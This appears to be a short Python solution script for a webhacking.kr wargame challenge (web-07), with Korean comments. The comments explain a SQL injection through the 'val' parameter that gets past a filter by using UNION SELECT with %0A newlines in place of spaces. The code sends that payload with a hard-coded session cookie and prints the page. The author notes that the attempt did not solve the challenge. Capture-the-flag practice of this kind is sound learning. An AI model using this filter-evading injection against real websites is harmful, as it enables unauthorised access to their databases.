#http://webhacking.kr/challenge/web/web-07/index.php?val=1
'''
---설명---
val= 이후에 sql injection이 먹히고 필터링이 걸려 있으나 union과 select는 사용 가능
select lv from lv1 where lv=($go) 구문을 확인 할 수 있으나
$go 값에 '3) union select (3-1' 값이 들어가면 됨(필터링 규칙 참고)
또한 공백이 들어가서 인식하기 때문에 %20공백을 인식하기 때문에 여기서는 %0A(LF,개행)로 변경하면 된다
다만, 문제는 현재 페이지 오류인지 문제가 안풀림
'''
import urllib.request

phpsessid='805defb40aabf56fc3bdc3336a183499'

url = 'http://webhacking.kr/challenge/web/web-07/index.php?val=3'
query =')%0Aunion%0Aselect%0A(3-1'

req=urllib.request.Request(url+query)
# 2.URL헤더를 수정
req.add_header('Cookie',"PHPSESSID=%s" %(phpsessid))
html=urllib.request.urlopen(req).read().decode()
print(html)